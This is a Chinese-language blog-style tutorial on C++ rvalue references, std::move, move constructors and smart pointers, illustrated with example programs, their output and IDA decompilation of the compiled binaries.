<h2 id="右值引用"><a href="#右值引用" class="headerlink" title="右值引用"></a>右值引用</h2><p><strong>左值 &amp; 右值</strong></p>
<ul>
<li>左值是可以放在赋值号左边可以被赋值的值，左值必须要在内存中有实体<ul>
<li>当左值被赋值时，左值本身保留</li>
</ul>
</li>
<li>右值当在赋值号右边取出值赋给其他变量的值，右值可以在内存也可以在CPU寄存器<ul>
<li>当右值被赋值时，右值会被释放</li>
</ul>
</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> &amp;b = a;		<span class="comment">/* 左值引用(b相当于a的别名) */</span></span><br><span class="line">    <span class="keyword">int</span> &amp;&amp;c = <span class="number">20</span>;	<span class="comment">/* 右值引用(c相当于20的别名) */</span></span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; &amp;a &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; a &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; &amp;b &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; b &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; &amp;c &lt;&lt; <span class="string">&quot;:&quot;</span> &lt;&lt; c &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7ffc2d216c30</span>:<span class="number">10</span></span><br><span class="line"><span class="number">0x7ffc2d216c30</span>:<span class="number">10</span></span><br><span class="line"><span class="number">0x7ffc2d216c34</span>:<span class="number">20</span></span><br></pre></td></tr></table></figure>
<p>IDA 分析：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">v13 = <span class="number">10</span>; <span class="comment">/* int a = 10 */</span></span><br><span class="line">v15 = &amp;v13; <span class="comment">/* int &amp;b = a */</span></span><br><span class="line">v14 = <span class="number">20</span>; <span class="comment">/* int &amp;&amp;c = 20 */</span></span><br><span class="line">v16 = &amp;v14;</span><br><span class="line">v3 = std::ostream::<span class="keyword">operator</span>&lt;&lt;(&amp;std::cout, &amp;v13);</span><br><span class="line">v4 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(v3, <span class="string">&quot;:&quot;</span>);</span><br><span class="line">v5 = std::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, v13);</span><br><span class="line">std::ostream::<span class="keyword">operator</span>&lt;&lt;(v5, &amp;std::endl&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">v6 = std::ostream::<span class="keyword">operator</span>&lt;&lt;(&amp;std::cout, v15);</span><br><span class="line">v7 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(v6, <span class="string">&quot;:&quot;</span>);</span><br><span class="line">v8 = std::ostream::<span class="keyword">operator</span>&lt;&lt;(v7, *v15);</span><br><span class="line">std::ostream::<span class="keyword">operator</span>&lt;&lt;(v8, &amp;std::endl&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">v9 = std::ostream::<span class="keyword">operator</span>&lt;&lt;(&amp;std::cout, v16);</span><br><span class="line">v10 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(v9, <span class="string">&quot;:&quot;</span>);</span><br><span class="line">v11 = std::ostream::<span class="keyword">operator</span>&lt;&lt;(v10, *v16);</span><br><span class="line">std::ostream::<span class="keyword">operator</span>&lt;&lt;(v11, &amp;std::endl&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br></pre></td></tr></table></figure>
<ul>
<li>在底层，右值引用相当于是赋值与左值引用的结合</li>
</ul>
<p><strong>std::move</strong></p>
<p><code>std::move</code> 唯一的功能是将一个左值强制转化为右值引用</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Ty</span>&gt;</span></span><br><span class="line"><span class="keyword">inline</span> _CONST_FUN <span class="keyword">typename</span> remove_reference&lt;_Ty&gt;::<span class="function">type&amp;&amp; <span class="title">move</span><span class="params">(_Ty&amp;&amp; _Arg)</span> _NOEXCEPT </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">static_cast</span>&lt;<span class="keyword">typename</span> remove_reference&lt;_Ty&gt;::type&amp;&amp;&gt;(_Arg));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>如果是左值，就通过 <code>static_cast</code> 将传进来的参数强转为右值并返回</li>
<li>如果是右值，直接返回 </li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;utility&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    std::string s = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    std::string sleft;</span><br><span class="line">    std::string sright;</span><br><span class="line"></span><br><span class="line">    sleft = s; <span class="comment">/* 左值赋值 */</span></span><br><span class="line">    std::cout &lt;&lt; s &lt;&lt; endl;</span><br><span class="line">    std::cout &lt;&lt; sleft &lt;&lt; endl;</span><br><span class="line">    sright = std::<span class="built_in">move</span>(s); <span class="comment">/* 右值赋值 */</span></span><br><span class="line">    std::cout &lt;&lt; s &lt;&lt; endl;</span><br><span class="line">    std::cout &lt;&lt; sright &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Hello</span><br><span class="line">Hello</span><br><span class="line"></span><br><span class="line">Hello</span><br></pre></td></tr></table></figure>
<ul>
<li>左值赋值：字符串 s 仍然存在</li>
<li>右值赋值：字符串 s 被置空</li>
</ul>
<p>IDA 分析：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">std::allocator&lt;<span class="keyword">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v9, argv, envp);</span><br><span class="line">std::string::basic_string&lt;std::allocator&lt;<span class="keyword">char</span>&gt;&gt;(v10, <span class="string">&quot;Hello&quot;</span>, &amp;v9);</span><br><span class="line">std::allocator&lt;<span class="keyword">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v9);</span><br><span class="line">std::string::<span class="built_in">basic_string</span>(v11);</span><br><span class="line">std::string::<span class="built_in">basic_string</span>(v12);</span><br><span class="line">std::string::<span class="keyword">operator</span>=(v11, v10);</span><br><span class="line">v3 = std::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="keyword">char</span>&gt;(&amp;std::cout, v10);</span><br><span class="line">std::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;std::endl&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">v4 = std::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="keyword">char</span>&gt;(&amp;std::cout, v11);</span><br><span class="line">std::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, &amp;std::endl&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">v5 = std::move&lt;std::string &amp;&gt;(v10);</span><br><span class="line">std::string::<span class="keyword">operator</span>=(v12, v5);</span><br><span class="line">v6 = std::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="keyword">char</span>&gt;(&amp;std::cout, v10);</span><br><span class="line">std::ostream::<span class="keyword">operator</span>&lt;&lt;(v6, &amp;std::endl&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">v7 = std::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="keyword">char</span>&gt;(&amp;std::cout, v12);</span><br><span class="line">std::ostream::<span class="keyword">operator</span>&lt;&lt;(v7, &amp;std::endl&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">std::string::~<span class="built_in">string</span>(v12);</span><br><span class="line">std::string::~<span class="built_in">string</span>(v11);</span><br><span class="line">std::string::~<span class="built_in">string</span>(v10)</span><br></pre></td></tr></table></figure>
<ul>
<li><code>std::move</code> 在底层会直接返回参数的原始值，真正置空字符串 s 的操作是 <code>std::string::operator=()</code> 函数</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall std::move&lt;std::string &amp;&gt;(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>仔细分析可以发现左值赋值和右值赋值调用的 <code>std::string::operator=()</code> 函数不一样</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000002509</span> E8 E2 FC FF FF                call    __ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEaSERKS4_ ; std::string::<span class="keyword">operator</span>=(std::string <span class="keyword">const</span>&amp;)</span><br><span class="line">.text:<span class="number">0000000000002509</span></span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000002577</span> E8 <span class="number">84</span> FD FF FF                call    __ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEaSEOS4_ ; std::string::<span class="keyword">operator</span>=(std::string&amp;&amp;)</span><br><span class="line">.text:<span class="number">0000000000002577</span></span><br></pre></td></tr></table></figure>
<p><strong>拷贝构造函数 &amp; 移动构造函数</strong></p>
<p>如果想用其它对象初始化一个同类的新对象，只能借助类中的拷贝构造函数</p>
<ul>
<li>其实现原理是为新对象复制一份和其它对象一模一样的数据</li>
<li>当类中拥有指针类型的成员变量时，拷贝构造函数中需要以深拷贝的方式复制该指针成员 </li>
</ul>
<p>移动构造函数使用右值引用形式的参数</p>
<ul>
<li>在此构造函数中，num 指针变量采用的是浅拷贝的复制方式</li>
<li>在函数内部置空了 d.num（为了避免 “同一块对空间被释放多次”）</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">demo</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">demo</span>():<span class="built_in">num</span>(<span class="keyword">new</span> <span class="built_in"><span class="keyword">int</span></span>(<span class="number">1</span>))&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;construct!&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">demo</span>(<span class="keyword">const</span> demo &amp;d):<span class="built_in">num</span>(<span class="keyword">new</span> <span class="built_in"><span class="keyword">int</span></span>(*d.num))&#123; <span class="comment">/* 拷贝构造函数(深拷贝) */</span></span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;copy construct!&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">demo</span>(demo &amp;&amp;d):<span class="built_in">num</span>(d.num)&#123; <span class="comment">/* 移动构造函数 */</span></span><br><span class="line">        d.num = <span class="literal">NULL</span>;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;move construct!&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    ~<span class="built_in">demo</span>()&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;class destruct!&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> *num;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function">demo <span class="title">get_demo</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">demo</span>();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    demo a = <span class="built_in">get_demo</span>();</span><br><span class="line">    demo b = a;</span><br><span class="line">    demo c = <span class="built_in">move</span>(a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>IDA 分析：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">get_demo</span>((demo *)v5);</span><br><span class="line">demo::<span class="built_in">demo</span>((demo *)v6, (<span class="keyword">const</span> demo *)v5); <span class="comment">/* 拷贝构造 */</span></span><br><span class="line">v3 = std::move&lt;demo &amp;&gt;(v5);</span><br><span class="line">demo::<span class="built_in">demo</span>(v7, v3); <span class="comment">/* 移动构造 */</span></span><br><span class="line">demo::~<span class="built_in">demo</span>((demo *)v7);</span><br><span class="line">demo::~<span class="built_in">demo</span>((demo *)v6);</span><br><span class="line">demo::~<span class="built_in">demo</span>((demo *)v5);</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">demo::demo</span><span class="params">(demo *<span class="keyword">this</span>, <span class="keyword">const</span> demo *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v2; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v2 = (_DWORD *)<span class="keyword">operator</span> <span class="built_in"><span class="keyword">new</span></span>(<span class="number">4uLL</span>);</span><br><span class="line">  *v2 = **(_DWORD **)a2;</span><br><span class="line">  *(_QWORD *)<span class="keyword">this</span> = v2;</span><br><span class="line">  v3 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;copy construct!&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;std::endl&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">demo::demo</span><span class="params">(_QWORD *a1, _QWORD *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  *a1 = *a2;</span><br><span class="line">  *a2 = <span class="number">0LL</span>;</span><br><span class="line">  v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;move construct!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="智能指针"><a href="#智能指针" class="headerlink" title="智能指针"></a>智能指针</h2><p>智能指针 (Smart Pointer) 是一种在 C++ 中用于管理动态分配的内存的类，它提供了一种灵活的方式来管理对象的生命周期，可以避免资源泄漏和内存错误</p>
<p><strong>auto_ptr</strong></p>
<p>当对象过期时，其析构函数将自动使用 delete 来释放内存：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Auto</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Auto</span>() &#123; cout &lt;&lt; <span class="string">&quot;Auto create&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">	~<span class="built_in">Auto</span>() &#123; cout &lt;&lt; <span class="string">&quot;Auto delete&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">    <span class="keyword">int</span> key1 = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> key2 = <span class="number">20</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="function">auto_ptr&lt;Auto&gt; <span class="title">test</span><span class="params">(<span class="keyword">new</span> Auto)</span></span>;</span><br><span class="line">    <span class="keyword">int</span> key1 = (*test).key1;</span><br><span class="line">    <span class="keyword">int</span> key2 = test-&gt;key2;</span><br><span class="line">    <span class="keyword">int</span> key3 = key1 + key2;</span><br><span class="line">    cout &lt;&lt; key3 &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>栈上的对象会在当前语句块结束时释放，堆上的对象需要使用 delete 释放</li>
<li>而 <code>auto_ptr</code> 属于栈上的对象，在它的析构函数中会尝试 delete 目标对象</li>
</ul>
<p>IDA 分析如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">v5 = (Auto *)<span class="keyword">operator</span> <span class="built_in"><span class="keyword">new</span></span>(<span class="number">8uLL</span>);</span><br><span class="line">Auto::<span class="built_in">Auto</span>(v5); <span class="comment">/* Auto的构造函数 */</span></span><br><span class="line">std::auto_ptr&lt;Auto&gt;::<span class="built_in">auto_ptr</span>(v8, v5); <span class="comment">/* auto_ptr的构造函数 */</span></span><br><span class="line">v6 = *(_DWORD *)std::auto_ptr&lt;Auto&gt;::<span class="keyword">operator</span>*(v8);</span><br><span class="line">v7 = v6 + *(_DWORD *)(std::auto_ptr&lt;Auto&gt;::<span class="keyword">operator</span>-&gt;(v8) + <span class="number">4</span>);</span><br><span class="line">v3 = std::ostream::<span class="keyword">operator</span>&lt;&lt;(&amp;std::cout, v7);</span><br><span class="line">std::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;std::endl&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">std::auto_ptr&lt;Auto&gt;::~<span class="built_in">auto_ptr</span>(v8); <span class="comment">/* auto_ptr的析构函数 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>在 <code>auto_ptr</code> 的析构函数中会自动释放 Auto（传入对象）：</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall std::auto_ptr&lt;Auto&gt;::~<span class="built_in">auto_ptr</span>(Auto **a1)</span><br><span class="line">&#123;</span><br><span class="line">  Auto *v1; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  v1 = *a1;</span><br><span class="line">  <span class="keyword">if</span> ( *a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    Auto::~<span class="built_in">Auto</span>(*a1);</span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(v1, <span class="number">8uLL</span>)</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>由 <code>auto_ptr</code> 创建的对象仍然具有指针的性质，其原因是 <code>auto_ptr</code> 对 <code>*</code>，<code>-&gt;</code> 等符号进行了重构</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall std::auto_ptr&lt;Auto&gt;::<span class="keyword">operator</span>*(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> *(_QWORD *)a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall std::auto_ptr&lt;Auto&gt;::<span class="keyword">operator</span>-&gt;(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> *(_QWORD *)a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>PS：对于 <code>*</code>，<code>-&gt;</code> 的重构只是实现了解引用而已，不负责具体的偏移</li>
</ul>
<p><strong>unique_ptr</strong></p>
<p><code>unique_ptr</code> 和 <code>auto_ptr</code> 的用法几乎一样，另外添加了如下几个特性：</p>
<ul>
<li>基于排他所有权模式：两个指针不能指向同一个资源</li>
<li>无法进行左值 <code>unique_ptr</code> 复制构造，也无法进行左值复制赋值操作，但允许临时右值赋值构造和赋值</li>
<li>在 STL 容器中使用 <code>unique_ptr</code>，不允许直接赋值 </li>
<li>支持对象数组的内存管理</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="function">unique_ptr&lt;string&gt; <span class="title">p1</span><span class="params">(<span class="keyword">new</span> string(<span class="string">&quot;11111111&quot;</span>))</span></span>;</span><br><span class="line">    <span class="function">unique_ptr&lt;string&gt; <span class="title">p2</span><span class="params">(<span class="keyword">new</span> string(<span class="string">&quot;22222222&quot;</span>))</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//p1 = p2;					    // 禁止左值赋值</span></span><br><span class="line">    <span class="comment">//unique_ptr&lt;string&gt; p3(p2);	// 禁止左值赋值构造</span></span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;p1:&quot;</span> &lt;&lt; p1.<span class="built_in">get</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;p2:&quot;</span> &lt;&lt; p2.<span class="built_in">get</span>() &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="function">unique_ptr&lt;string&gt; <span class="title">p3</span><span class="params">(std::move(p2))</span></span>; </span><br><span class="line">    p2 = std::<span class="built_in">move</span>(p1);	<span class="comment">// 使用move把左值转成右值就可以赋值了,效果和auto_ptr赋值一样</span></span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;-------------------&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;p1:&quot;</span> &lt;&lt; p1.<span class="built_in">get</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;p2:&quot;</span> &lt;&lt; p2.<span class="built_in">get</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;p3:&quot;</span> &lt;&lt; p3.<span class="built_in">get</span>() &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
